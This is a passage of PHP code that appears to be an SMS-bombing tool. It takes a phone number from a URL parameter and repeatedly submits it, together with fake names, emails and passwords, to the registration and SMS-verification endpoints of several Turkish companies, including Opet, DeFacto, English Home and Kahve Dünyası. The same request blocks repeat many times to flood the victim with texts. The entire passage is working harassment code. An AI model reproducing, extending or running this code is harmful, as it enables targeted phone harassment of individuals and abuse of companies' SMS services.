    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
